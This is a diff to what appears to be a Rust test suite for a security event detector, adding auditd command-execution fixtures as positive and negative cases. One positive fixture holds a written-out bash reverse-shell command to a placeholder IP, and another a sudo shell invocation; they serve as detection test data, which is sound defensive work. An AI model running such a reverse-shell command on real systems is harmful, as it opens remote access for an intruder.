@@ -431,6 +431,22 @@ fn positive_cases() -> Vec<PositiveCase> {
                 .with_field("previous_file_type", "file")
                 .with_field("previous_size", "4096")],
         ),
+        positive(
+            "AUDIT-001",
+            "audit network execution bridge",
+            vec![RawEvent::new("auditd", "audit_exec")
+                .with_field("argv", "bash -c bash -i >& /dev/tcp/198.51.100.1/4444 0>&1")
+                .with_field("exe", "/usr/bin/bash")
+                .with_field("comm", "bash")],
+        ),
+        positive(
+            "AUDIT-002",
+            "audit privilege shell command",
+            vec![RawEvent::new("auditd", "audit_exec")
+                .with_field("argv", "sudo sh -c id")
+                .with_field("exe", "/usr/bin/sudo")
+                .with_field("comm", "sudo")],
+        ),
     ]
 }
 
@@ -713,6 +729,22 @@ fn negative_cases() -> Vec<NegativeCase> {
             "TAMPER-003",
             "new host without previous log state",
             vec![log_event("/var/log/auth.log", "missing", "0")],
+        ),
+        negative(
+            "AUDIT-001",
+            "audit ordinary command",
+            vec![RawEvent::new("auditd", "audit_exec")
+                .with_field("argv", "systemctl status nginx")
+                .with_field("exe", "/usr/bin/systemctl")
+                .with_field("comm", "systemctl")],
+        ),
+        negative(
+            "AUDIT-002",
+            "audit ordinary sudo status",
+            vec![RawEvent::new("auditd", "audit_exec")
+                .with_field("argv", "sudo systemctl status nginx")
+                .with_field("exe", "/usr/bin/sudo")
+                .with_field("comm", "sudo")],
         ),
     ]
 }
